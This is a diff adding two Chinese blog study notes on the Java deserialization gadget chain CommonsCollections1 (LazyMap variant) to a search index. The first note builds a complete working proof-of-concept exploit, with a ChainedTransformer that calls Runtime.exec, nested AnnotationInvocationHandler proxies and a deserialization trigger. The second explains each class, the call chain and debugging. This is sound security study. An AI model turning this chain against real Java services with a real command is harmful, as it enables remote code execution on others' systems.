@@ -1,6 +1,785 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>正版cc1链学习</title>
+    <url>//2026/11/01/cc1-lazymap/</url>
+    <content><![CDATA[学习起点依旧根据前人的经验，从transformer接口来入手，顺便就当复习了transformer是一个接口，或者说是一个抽象类，里面有一个transfer方法，在实现这个类的时候要完成这个方法，我们可以看到有哪些具体的实现类不再赘述
+LazyMap 与 transform 调用这次链条的末尾还是invoketransformer，接着往下找，之前我们是走进了transformap，这次我们走进另一个调用它的地方，也就是lazymap
+/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.map;    import java.io.IOException;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.io.Serializable;  import java.util.Map;    import org.apache.commons.collections.Factory;  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.FactoryTransformer;    /**   * Decorates another &lt;code&gt;Map&lt;/code&gt; to create objects in the map on demand.   * &lt;p&gt;   * When the &#123;@link #get(Object)&#125; method is called with a key that does not   * exist in the map, the factory is used to create the object. The created * object will be added to the map using the requested key. * &lt;p&gt;   * For instance:   * &lt;pre&gt;   * Factory factory = new Factory() &#123;   *     public Object create() &#123; *         return new Date(); *     &#125; * &#125; * Map lazy = Lazy.map(new HashMap(), factory); * Object obj = lazy.get(&quot;NOW&quot;); * &lt;/pre&gt;   *   * After the above code is executed, &lt;code&gt;obj&lt;/code&gt; will contain   * a new &lt;code&gt;Date&lt;/code&gt; instance. Furthermore, that &lt;code&gt;Date&lt;/code&gt;   * instance is mapped to the &quot;NOW&quot; key in the map.   * &lt;p&gt;   * &lt;strong&gt;Note that LazyMap is not synchronized and is not thread-safe.&lt;/strong&gt;   * If you wish to use this map from multiple threads concurrently, you must use   * appropriate synchronization. The simplest approach is to wrap this map * using &#123;@link java.util.Collections#synchronizedMap(Map)&#125;. This class may throw    * exceptions when accessed by concurrent threads without synchronization.   * &lt;p&gt;   * This class is Serializable from Commons Collections 3.1.   * * @since Commons Collections 3.0   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   ** @author Stephen Colebourne   * @author Paul Jack   */public class LazyMap          extends AbstractMapDecorator          implements Map, Serializable &#123;        /** Serialization version */      private static final long serialVersionUID = 7990956402564206740L;        /** The factory to use to construct elements */      protected final Transformer factory;        /**       * Factory method to create a lazily instantiated map.     ** @param map  the map to decorate, must not be null       * @param factory  the factory to use, must not be null       * @throws IllegalArgumentException if map or factory is null       */    public static Map decorate(Map map, Factory factory) &#123;          return new LazyMap(map, factory);      &#125;        /**       * Factory method to create a lazily instantiated map.     ** @param map  the map to decorate, must not be null       * @param factory  the factory to use, must not be null       * @throws IllegalArgumentException if map or factory is null       */    public static Map decorate(Map map, Transformer factory) &#123;          return new LazyMap(map, factory);      &#125;        //-----------------------------------------------------------------------      /**       * Constructor that wraps (not copies).     ** @param map  the map to decorate, must not be null       * @param factory  the factory to use, must not be null       * @throws IllegalArgumentException if map or factory is null       */    protected LazyMap(Map map, Factory factory) &#123;          super(map);          if (factory == null) &#123;              throw new IllegalArgumentException(&quot;Factory must not be null&quot;);          &#125;          this.factory = FactoryTransformer.getInstance(factory);      &#125;        /**       * Constructor that wraps (not copies).     ** @param map  the map to decorate, must not be null       * @param factory  the factory to use, must not be null       * @throws IllegalArgumentException if map or factory is null       */    protected LazyMap(Map map, Transformer factory) &#123;          super(map);          if (factory == null) &#123;              throw new IllegalArgumentException(&quot;Factory must not be null&quot;);          &#125;          this.factory = factory;      &#125;        //-----------------------------------------------------------------------      /**       * Write the map out using a custom routine.     ** @param out  the output stream       * @throws IOException       * @since Commons Collections 3.1       */    private void writeObject(ObjectOutputStream out) throws IOException &#123;          out.defaultWriteObject();          out.writeObject(map);      &#125;        /**       * Read the map in using a custom routine.     ** @param in  the input stream       * @throws IOException       * @throws ClassNotFoundException       * @since Commons Collections 3.1       */    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;          in.defaultReadObject();          map = (Map) in.readObject();      &#125;        //-----------------------------------------------------------------------      public Object get(Object key) &#123;          // create value for key if key is not currently in the map          if (map.containsKey(key) == false) &#123;              Object value = factory.transform(key);              map.put(key, value);              return value;          &#125;          return map.get(key);      &#125;        // no need to wrap keySet, entrySet or values as they are views of      // existing map entries - you can&#x27;t do a map-style get on them.&#125;
+这个代码不长我们可以简单的看一下，它继承自AbstractMapDecorator，可以被序列化这里接收两个参数一个是map另一个是transformer，构造方法受保护，用decorate来创建对象，这里有一个get方法，我们的transformer在这里被使用，这个方法是输入一个值检查key是否有对应的value，如果没有调用已经实现的transformer生成一个value然后进行保存返回。我们只要输入的是invoke就可以了，我们先编写测试一下。
+public class cc1 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();          ConstantTransformer nihao = new ConstantTransformer(&quot;nihao&quot;);          Map decorate = LazyMap.decorate(oObjectHashMap, nihao);          Object hello = decorate.get(&quot;hello&quot;);          System.out.println(hello);          &#125;;  &#125;
+首先我们先测试一下这个lazymap的put方法，验证了我们的判断，接下来让它调用计算器
+public class cc1 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();          Runtime runtime = Runtime.getRuntime();          InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          Map decorate = LazyMap.decorate(oObjectHashMap, exec);          decorate.get(runtime);            &#125;;  &#125;
+不出意外可以正常调用计算器，那么这一步就完成了接着往上走看是谁调用了get方法
+追踪 AnnotationInvocationHandler这里有非常多的内容调用了它，暂时我还没有看到怎么具体去寻找，我们作为上帝知道了是AnnotationInvocationHandler调用了
+public Object invoke(Object proxy, Method method, Object[] args) &#123;      String member = method.getName();      Class&lt;?&gt;[] paramTypes = method.getParameterTypes();        // Handle Object and Annotation methods      if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;          paramTypes[0] == Object.class)          return equalsImpl(args[0]);      if (paramTypes.length != 0)          throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);        switch(member) &#123;      case &quot;toString&quot;:          return toStringImpl();      case &quot;hashCode&quot;:          return hashCodeImpl();      case &quot;annotationType&quot;:          return type;      &#125;        // Handle annotation member accessors      Object result = memberValues.get(member);        if (result == null)          throw new IncompleteAnnotationException(type, member);        if (result instanceof ExceptionProxy)          throw ((ExceptionProxy) result).generateException();        if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0)          result = cloneArray(result);        return result;  &#125;
+在这个invoke方法中我们之前也了解这个类了，我们知道他自己写了readobject了，我们去看一看这里的membervalues是我们可以控制的，那么我们就要控制他为lazymap去调用get方法这个类是InvocationHandler的实现类，是一个动态代理，在invoke方法中会自动执行get方法，这就是我们利用的关键。
+动态代理实验与排错接下来我们来实现
+import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.map.LazyMap;  import org.example.LazyMapStudy;  import java.lang.reflect.InvocationHandler;    import java.lang.reflect.Constructor;  import java.lang.reflect.Proxy;  import java.util.HashMap;  import java.util.Map;    public class cc1 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();          Runtime runtime = Runtime.getRuntime();          InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          Map decorate = LazyMap.decorate(oObjectHashMap, exec);  //        decorate.get(runtime);          //因为AnnotationInvocationHandler是不能被直接创建的，因此我们使用反射的方法进行创建          Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);          declaredConstructor.setAccessible(true);          InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);            Map proxyInstance = (Map) Proxy.newProxyInstance(                  Map.class.getClassLoader(),                  new Class[]&#123;Map.class&#125;,                  handler          );          proxyInstance.entrySet();            &#125;;  &#125;
+我们进行编写验证发现报错，我们重新捋一下这个步骤。我们创建了代理对象和处理器，代理对象把这个方法交给处理器，处理器使用自己的invoke方法，其中有这么一段代码Object result &#x3D; memberValues.get(member);我们传入的是lazymap类型的，因此调用lazymap的get方法，这里的member就是entryset，然后到get中过去执行，显然不能继续我们的利用链，我们要让get中的是runtime对象，因此我们要写一个chaintransformeer来让我们的链条可以继续下去
+import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.map.LazyMap;  import org.example.LazyMapStudy;  import java.lang.reflect.InvocationHandler;    import java.lang.reflect.Constructor;  import java.lang.reflect.Proxy;  import java.util.HashMap;  import java.util.Map;    public class cc1 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();          Transformer[] transformers = new Transformer[]&#123;                  new ConstantTransformer(Runtime.class),                  new InvokerTransformer(&quot;getMethod&quot;,                          new Class[]&#123;String.class, Class[].class&#125;,                          new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                  new InvokerTransformer(&quot;invoke&quot;,                          new Class[]&#123;Object.class, Object[].class&#125;,                          new Object[]&#123;null, new Object[0]&#125;),                  new InvokerTransformer(&quot;exec&quot;,                          new Class[]&#123;String.class&#125;,                          new Object[]&#123;&quot;calc&quot;&#125;)          &#125;;          Transformer chain = new ChainedTransformer(transformers);          Map decorate = LazyMap.decorate(oObjectHashMap, chain);  //        decorate.get(runtime);          //因为AnnotationInvocationHandler是不能被直接创建的，因此我们使用反射的方法进行创建          Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);          declaredConstructor.setAccessible(true);          InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);            Map proxyInstance = (Map) Proxy.newProxyInstance(                  Map.class.getClassLoader(),                  new Class[]&#123;Map.class&#125;,                  handler          );          proxyInstance.entrySet();            &#125;;  &#125;
+我们离成功已经很近了
+构造两层 Handler我们只需要解决一个问题，我们不执行entryset，让readobject里面去执行，如果我们直接进行序列化反序列化，我们发现首先回复handler，然后这里的membervalues是decorate，这也就意味着实际执行的是decorate.entryset，这很明显不会执行invoke方法，所以我们要想办法让他执行，我们让decorate变成代理就可以了，所以我们再增加一步
+import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class cc1 &#123;    public static void main(String[] args) throws Exception &#123;        HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;,                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;,                        new Class[]&#123;Object.class, Object[].class&#125;,                        new Object[]&#123;null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;,                        new Object[]&#123;&quot;calc&quot;&#125;),                new ConstantTransformer(null)   // 末尾加 null，避免返回值强转 Set 报错        &#125;;        Transformer chain = new ChainedTransformer(transformers);        Map decorate = LazyMap.decorate(oObjectHashMap, chain);        Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);        declaredConstructor.setAccessible(true);        // 内层 handler：memberValues = LazyMap        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);        // 代理对象：handler 作为 InvocationHandler        Map proxyInstance = (Map) Proxy.newProxyInstance(                Map.class.getClassLoader(),                new Class[]&#123;Map.class&#125;,                handler        );        // 外层 handler：memberValues = proxyInstance，作为反序列化入口        InvocationHandler hander1 = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyInstance);        // ===== 序列化 =====        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(barr);        oos.writeObject(hander1);        oos.close();        System.out.println(&quot;序列化完成，字节数: &quot; + barr.size());        // ===== 反序列化（触发） =====        System.out.println(&quot;开始反序列化...&quot;);        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));        ois.readObject();        ois.close();    &#125;&#125;
+成功弹出计算器，今天的任务完成
+学习回顾我们再来梳理一下今天的学习内容
+我们还是从invoketransformer入手，我们这次找到了lazymap，他其中的get方法可以调用transformer执行命令，接下来我们又发现handler的一个实现类，我们发现的invoke方法中是可以调用get的，同时他还有readobject，他会对传入的map进行entryset，我们要对传入的map是一个代理才可以进入invoke，还要保证invoke里面的是lazymap才可以让这个过程顺利执行，所以我们写了两层handler。这也是cc1中很精妙的一部分。
+
+本系列笔记： Java安全学习 · Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记 · cc1链学习 · 正版cc1链学习 · cc3链学习 · cc6链学习
+]]></content>
+      <categories>
+        <category>安全学习</category>
+        <category>Java 反序列化</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>反序列化</tag>
+        <tag>CC1</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记</title>
+    <url>//2026/11/01/cc1-study-notes/</url>
+    <content><![CDATA[
+实验环境
+
+JDK：1.8.0_65
+
+IDE：IntelliJ IDEA
+
+依赖：Commons Collections 3.2.1
+
+研究对象：CC1 LazyMap + 动态代理调用链
+
+参考项目：ysoserial
+
+注意：经典 CC1 依赖历史 JDK 行为，JDK 8u71 之后的相关修复会阻断经典路径。
+
+
+
+一、Commons Collections 简介Apache Commons Collections 是对 Java 集合框架的扩展，提供额外的集合操作功能。
+CC1 中涉及的主要类：
+
+
+
+类
+作用
+
+
+
+Transformer
+对象转换接口
+
+
+ConstantTransformer
+返回指定常量
+
+
+InvokerTransformer
+通过反射调用方法
+
+
+ChainedTransformer
+串联多个 Transformer
+
+
+LazyMap
+键不存在时触发 Transformer
+
+
+AnnotationInvocationHandler
+JDK 内部注解调用处理器
+
+
+Proxy
+Java 动态代理
+
+
+核心原理：通过反序列化恢复对象时产生的方法调用，间接触发第三方集合类中的 Transformer。
+
+二、Transformer 接口2.1 接口定义public interface Transformer &#123;    Object transform(Object input);&#125;
+
+
+返回值 Object：转换后的对象。
+
+参数 Object input：当前 Transformer 接收的对象。
+
+
+使用 Object 类型可以让转换器处理多种引用类型。
+2.2 ConstantTransformer核心源码：
+private final Object iConstant;public ConstantTransformer(Object constantToReturn) &#123;    super();    iConstant = constantToReturn;&#125;public Object transform(Object input) &#123;    return iConstant;&#125;
+
+特点：
+
+构造方法将传入的常量保存到 iConstant 字段。
+
+transform() 不使用 input。
+
+每次调用均返回对象内部保存的 iConstant。
+
+
+示例：
+Transformer t = new ConstantTransformer(&quot;hello&quot;);System.out.println(t.transform(&quot;abc&quot;));
+
+输出：
+hello
+
+实例字段与方法参数的区别：
+
+iConstant 是创建对象时保存的状态。
+
+input 是调用 transform() 时传入的参数。
+
+
+不同 ConstantTransformer 实例可以保存不同的 iConstant。
+2.3 InvokerTransformer构造方法示例：
+Transformer t = new InvokerTransformer(    &quot;toUpperCase&quot;,    new Class[]&#123;&#125;,    new Object[]&#123;&#125;);Object result = t.transform(&quot;hello&quot;);
+
+结果：
+HELLO
+
+核心源码逻辑：
+Class cls = input.getClass();Method method = cls.getMethod(    iMethodName,    iParamTypes);return method.invoke(input, iArgs);
+
+变量含义：
+
+
+
+字段或变量
+含义
+
+
+
+input
+被调用方法所属的对象
+
+
+iMethodName
+指定的方法名
+
+
+iParamTypes
+方法形参类型数组
+
+
+iArgs
+方法实际参数数组
+
+
+cls
+输入对象对应的 Class
+
+
+method
+通过反射找到的方法
+
+
+例如：
+new InvokerTransformer(    &quot;substring&quot;,    new Class[]&#123;int.class&#125;,    new Object[]&#123;6&#125;);
+
+当输入为 &quot;hello java&quot; 时，相当于：
+&quot;hello java&quot;.substring(6);
+
+返回：
+java
+
+注意：
+
+int.class 表示方法参数类型。
+
+new Object[]&#123;6&#125; 表示实际参数。
+
+substring() 属于 String 类，不属于 int 类。
+
+
+2.4 ChainedTransformer核心源码：
+public Object transform(Object object) &#123;    for (int i = 0; i &lt; iTransformers.length; i++) &#123;        object = iTransformers[i].transform(object);    &#125;    return object;&#125;
+
+作用：按顺序执行数组中的 Transformer。
+示例：
+Transformer[] transformers = new Transformer[]&#123;    new ConstantTransformer(&quot;abcdef&quot;),    new InvokerTransformer(        &quot;substring&quot;,        new Class[]&#123;int.class&#125;,        new Object[]&#123;2&#125;    ),    new InvokerTransformer(        &quot;toUpperCase&quot;,        new Class[]&#123;&#125;,        new Object[]&#123;&#125;    )&#125;;
+
+调用：
+Transformer chain = new ChainedTransformer(transformers);Object result = chain.transform(&quot;hello&quot;);
+
+执行过程：
+&quot;hello&quot;   ↓ConstantTransformer   ↓&quot;abcdef&quot;   ↓InvokerTransformer.substring(2)   ↓&quot;cdef&quot;   ↓InvokerTransformer.toUpperCase()   ↓&quot;CDEF&quot;
+
+结论：
+每个 Transformer 的输出都是下一个 Transformer 的输入。
+ChainedTransformer 使用的是循环调用，不是递归。
+
+三、LazyMap 的触发机制3.1 LazyMap 的作用普通 HashMap：
+Map map = new HashMap();map.get(&quot;name&quot;);
+
+键不存在时，返回 null。
+LazyMap 则可以在键不存在时，通过 Transformer 自动生成值。
+示例：
+Map innerMap = new HashMap();Transformer transformer =    new ConstantTransformer(&quot;Hello LazyMap&quot;);Map lazyMap = LazyMap.decorate(    innerMap,    transformer);
+
+3.2 LazyMap.get() 源码public Object get(Object key) &#123;    if (map.containsKey(key) == false) &#123;        Object value = factory.transform(key);        map.put(key, value);        return value;    &#125;    return map.get(key);&#125;
+
+执行过程：
+lazyMap.get(&quot;name&quot;)       ↓map.containsKey(&quot;name&quot;)       ↓键不存在       ↓factory.transform(&quot;name&quot;)       ↓获得转换结果       ↓map.put(&quot;name&quot;, value)       ↓return value
+
+触发条件：
+
+如果键不存在，执行 Transformer 并保存生成的值。
+
+如果键已经存在，直接返回保存的值，不再执行 Transformer。
+
+
+注意：即使某个键对应的值是 null，只要该键存在，containsKey() 仍然为 true。
+3.3 factory 与 transformer 的关系Transformer transformer =    new ConstantTransformer(&quot;Hello LazyMap&quot;);Map lazyMap = LazyMap.decorate(    new HashMap(),    transformer);
+
+decorate()：
+public static Map decorate(Map map, Transformer factory) &#123;    return new LazyMap(map, factory);&#125;
+
+构造方法：
+protected LazyMap(Map map, Transformer factory) &#123;    super(map);    this.factory = factory;&#125;
+
+这里的 transformer 和 factory 不是两个新对象，而是两个指向同一个 Transformer 实例的引用。
+this.factory 将该引用保存到 LazyMap 内部。
+因此以后执行：
+factory.transform(key);
+
+就能调用我们创建的 Transformer。
+
+四、Java 动态代理4.1 Proxy 与 InvocationHandler动态代理涉及两个核心对象：
+Proxy：代理对象
+用于接收对接口方法的调用。
+InvocationHandler：调用处理器
+决定代理对象的方法被调用时，具体执行什么逻辑。
+示例：
+InvocationHandler handler = (proxy, method, args) -&gt; &#123;    System.out.println(method.getName());    return null;&#125;;Map proxyMap = (Map) Proxy.newProxyInstance(    Map.class.getClassLoader(),    new Class[]&#123;Map.class&#125;,    handler);
+
+调用：
+proxyMap.entrySet();
+
+会进入：
+handler.invoke(proxy, method, args);
+
+其中 method.getName() 为：
+entrySet
+
+4.2 invoke() 的参数Object invoke(    Object proxy,    Method method,    Object[] args)
+
+
+
+
+参数
+含义
+
+
+
+proxy
+接收方法调用的代理对象
+
+
+method
+被调用的接口方法
+
+
+args
+调用方法时传入的实际参数
+
+
+例如：
+proxyMap.get(&quot;name&quot;);
+
+对应：
+method.getName() = &quot;get&quot;args[0] = &quot;name&quot;
+
+而：
+proxyMap.entrySet();
+
+对应：
+method.getName() = &quot;entrySet&quot;args = null
+
+无参代理方法的 args 通常为 null。
+4.3 两种 invoke() 的区别InvocationHandler.invoke()
+处理代理对象的方法调用：
+handler.invoke(proxy, method, args);
+
+Method.invoke()
+通过 Java 反射执行指定方法：
+method.invoke(target, args);
+
+两者不是同一个方法。
+尤其需要注意：
+InvocationHandler.invoke() 内部不一定必须使用反射。
+例如：
+InvocationHandler handler = (proxy, method, args) -&gt; &#123;    lazyMap.get(&quot;name&quot;);    return new HashSet();&#125;;
+
+这里直接调用 LazyMap.get()，没有使用 Method.invoke()。
+4.4 代理返回值类型假设调用：
+proxyMap.entrySet();
+
+Map.entrySet() 的返回类型是 Set。
+如果 handler 返回 String，代理方法最终可能抛出 ClassCastException。
+但如果在返回值类型检查之前，handler 已经调用了 LazyMap，那么此前产生的副作用可能已经发生。
+结论：
+方法最终抛出异常，不代表之前执行的操作没有发生。
+
+五、AnnotationInvocationHandler5.1 类的作用JDK 8 中的内部类：
+sun.reflect.annotation.AnnotationInvocationHandler
+
+它实现：
+InvocationHandlerSerializable
+
+因此：
+
+可以作为动态代理的调用处理器。
+
+可以作为 Java 序列化对象图的一部分。
+
+
+5.2 构造方法AnnotationInvocationHandler(    Class&lt;? extends Annotation&gt; type,    Map&lt;String, Object&gt; memberValues) &#123;    this.type = type;    this.memberValues = memberValues;&#125;
+
+两个重要字段：
+
+
+
+字段
+作用
+
+
+
+type
+保存注解类型
+
+
+memberValues
+保存注解成员值的 Map 引用
+
+
+5.3 通过反射获取构造方法Class&lt;?&gt; clazz = Class.forName(    &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor&lt;?&gt; constructor =    clazz.getDeclaredConstructor(        Class.class,        Map.class    );constructor.setAccessible(true);
+
+逐行解释：
+Class.forName()
+根据完整类名获取 Class 对象。
+getDeclaredConstructor()
+查找当前类声明的、形参类型为 Class 和 Map 的构造方法。
+setAccessible(true)
+请求绕过 Java 语言访问检查，以使用非公开构造方法。
+它不会把原始构造方法永久改为 public。
+5.4 Constructor.newInstance()InvocationHandler handlerB =    (InvocationHandler) constructor.newInstance(        Override.class,        lazyMap    );
+
+这里才真正创建 Handler 实例。
+对应构造参数：
+type = Override.classmemberValues = lazyMap
+
+其中 Override.class 是 JDK 内置注解类型。
+创建对象时只进行初始化，不会自动执行 Handler 的 invoke()。
+
+六、AnnotationInvocationHandler.invoke() 源码JDK 8u65 中反编译的变量名及含义：
+
+
+
+变量
+含义
+
+
+
+var1
+proxy
+
+
+var2
+method
+
+
+var3
+args
+
+
+var4
+methodName
+
+
+var5
+parameterTypes
+
+
+var6
+result
+
+
+关键逻辑：
+String methodName = method.getName();Class[] parameterTypes = method.getParameterTypes();if (methodName.equals(&quot;equals&quot;)        &amp;&amp; parameterTypes.length == 1        &amp;&amp; parameterTypes[0] == Object.class) &#123;    return this.equalsImpl(args[0]);&#125; else if (parameterTypes.length != 0) &#123;    throw new AssertionError(        &quot;Too many parameters for an annotation method&quot;    );&#125;
+
+随后判断：
+switch (methodName) &#123;    case &quot;toString&quot;:        return this.toStringImpl();    case &quot;hashCode&quot;:        return this.hashCodeImpl();    case &quot;annotationType&quot;:        return this.type;    default:        Object result =            this.memberValues.get(methodName);&#125;
+
+6.1 为什么 entrySet() 可以进入 default？当代理对象调用：
+proxyMap.entrySet();
+
+得到：
+methodName = &quot;entrySet&quot;parameterTypes.length = 0
+
+因此：
+
+不进入 equals 分支。
+
+不触发参数数量异常。
+
+不匹配 toString、hashCode、annotationType。
+
+最终进入 default。
+
+
+执行：
+this.memberValues.get(&quot;entrySet&quot;);
+
+6.2 为什么 get(“name”) 不可以？如果代理对象调用：
+proxyMap.get(&quot;name&quot;);
+
+得到：
+methodName = &quot;get&quot;parameterTypes.length = 1
+
+由于 get(Object key) 有一个形参，且不属于特殊处理的 equals(Object)，因此触发：
+throw new AssertionError(    &quot;Too many parameters for an annotation method&quot;);
+
+不会进入 default 分支。
+注意：getParameterTypes().length 表示方法形参数量，不是方法名的字符数。
+
+七、AnnotationInvocationHandler.readObject()经典 JDK 8u65 中的相关源码：
+private void readObject(ObjectInputStream stream)        throws IOException, ClassNotFoundException &#123;    stream.defaultReadObject();    AnnotationType annotationType =        AnnotationType.getInstance(this.type);    Map memberTypes = annotationType.memberTypes();    for (Map.Entry entry : this.memberValues.entrySet()) &#123;        // 注解成员类型检查    &#125;&#125;
+
+7.1 defaultReadObject()stream.defaultReadObject();
+
+恢复当前对象能够通过默认序列化机制处理的字段。
+重点包括：
+this.typethis.memberValues
+
+7.2 AnnotationType.getInstance()AnnotationType.getInstance(this.type);
+
+获取注解类型的元信息。
+例如注解有哪些成员，以及成员应该是什么类型。
+7.3 memberTypes()Map memberTypes = annotationType.memberTypes();
+
+获取注解成员名称与对应类型之间的映射。
+7.4 memberValues.entrySet()for (Map.Entry entry : this.memberValues.entrySet()) &#123;
+
+这一行是经典 CC1 的重要调用位置。
+如果 memberValues 是普通 Map，那么只是普通集合遍历。
+如果 memberValues 是动态代理 Map，那么调用 entrySet() 会进入代理对象绑定的 InvocationHandler.invoke()。
+
+八、经典 CC1 LazyMap 版本的对象关系经典 ysoserial CC1 使用两个不同的 AnnotationInvocationHandler 实例。
+Handler A    │    └── memberValues → proxyMap                           │                           └── InvocationHandler → Handler B                                                      │                                                      └── memberValues → LazyMap                                                                            │                                                                            └── factory → ChainedTransformer
+
+Handler A作用：作为反序列化处理过程中的外层对象。
+其 memberValues 指向代理 Map。
+Handler B作用：作为代理 Map 的 InvocationHandler。
+其 memberValues 指向 LazyMap。
+两个 Handler 属于相同的类，但不是同一个对象。
+当执行 Handler A 的实例方法时：
+this.memberValues
+
+指向代理 Map。
+当执行 Handler B 的实例方法时：
+this.memberValues
+
+指向 LazyMap。
+这体现了 Java 中 this 与实例字段的关系。
+
+九、经典 CC1 LazyMap 调用链完整关键路径：
+ObjectInputStream.readObject()           │           ▼AnnotationInvocationHandler.readObject()           │           ▼this.memberValues.entrySet()           │           ▼Proxy Map.entrySet()           │           ▼Handler B.invoke()           │           ▼method.getName()           │           └── &quot;entrySet&quot;                    │                    ▼this.memberValues.get(&quot;entrySet&quot;)           │           ▼LazyMap.get(&quot;entrySet&quot;)           │           ▼map.containsKey(&quot;entrySet&quot;)           │           └── false                    │                    ▼factory.transform(&quot;entrySet&quot;)           │           ▼ChainedTransformer.transform()           │           ▼各个 Transformer 依次执行
+
+关键原理反序列化期间执行了一个看似正常的 entrySet()。
+但由于实际对象是动态代理 Map，这次方法调用被转交给 Handler B。
+Handler B 根据方法名称访问 LazyMap。
+LazyMap 在键不存在时触发 Transformer。
+整个过程中，程序入口并没有直接调用 Transformer，而是通过对象之间的方法调用间接触发。
+
+十、LazyMap 的自定义反序列化调试时还遇到了：
+private void readObject(ObjectInputStream in)        throws IOException, ClassNotFoundException &#123;    in.defaultReadObject();    map = (Map) in.readObject();&#125;
+
+这是 LazyMap 自己的反序列化恢复逻辑。
+原因是其父类 AbstractMapDecorator 中存在：
+protected transient Map map;
+
+transient 字段不会通过默认字段序列化自动保存。
+因此，相关自定义序列化逻辑需要负责保存及恢复底层 Map。
+这里要区分：
+
+
+
+方法
+作用
+
+
+
+LazyMap.readObject()
+恢复 LazyMap 内部状态
+
+
+LazyMap.get()
+访问键，必要时执行 Transformer
+
+
+进入 LazyMap.readObject() 并不代表 Transformer 已经触发。
+
+十一、IDEA Debug 技巧11.1 三种 Step
+
+
+快捷键
+功能
+作用
+
+
+
+F7
+Step Into
+进入方法内部
+
+
+F8
+Step Over
+执行当前行，不进入内部调用
+
+
+Shift + F8
+Step Out
+执行完当前方法并返回调用者
+
+
+F9
+Resume Program
+继续执行到下一个断点
+
+
+11.2 观察调用栈Debug 窗口的 Frames 用于查看当前方法由谁调用。
+分析反序列化时，应重点判断：
+
+当前位于哪个对象的 readObject()。
+
+是否经过动态代理类。
+
+当前 Handler 是哪一个实例。
+
+方法调用是否进入了 LazyMap。
+
+是否真正执行 ChainedTransformer.transform()。
+
+
+11.3 反编译变量名IDEA 打开 JDK 的 .class 文件时，可能显示：
+Decompiled .class file
+
+局部变量名可能变成 var1、var2 等。
+可以尝试为 JDK 配置对应版本的 src.zip 源码包，以改善阅读体验。
+11.4 调试时的常见误区误区一：反序列化成功等于漏洞触发成功。
+错误。正常执行完 readObject() 不代表 Transformer 被触发。
+误区二：进入 AnnotationInvocationHandler.invoke() 就是 CC1 成功。
+错误。JDK 正常处理注解时也会使用这个方法。
